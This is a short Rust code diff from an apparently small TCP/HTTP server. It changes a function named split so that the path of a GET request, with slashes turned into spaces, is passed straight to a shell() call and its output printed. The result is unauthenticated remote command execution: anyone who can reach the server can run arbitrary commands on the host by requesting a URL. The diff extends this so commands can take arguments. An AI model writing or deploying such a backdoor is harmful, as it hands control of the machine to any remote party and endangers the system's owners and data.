@@ -50,8 +50,10 @@ fn handle_connection(mut stream: TcpStream){
 fn split(str_get: String, mut stream: TcpStream) -> String {
     let take: Vec<&str> = str_get.split(" HTTP/1.1").collect();
     let head = take[0].to_string();
-    let take: Vec<&str> = head.split("/").collect();
-    let cmd = take[1];
+    let take: Vec<&str> = head.split("GET /").collect();
+    let head = take[1].to_string();
+    println!("{}", head);
+    let cmd = head.replace("/", " ");
     println!("{}",cmd);
     let out = shell(cmd.to_string());
     println!("{}", out);
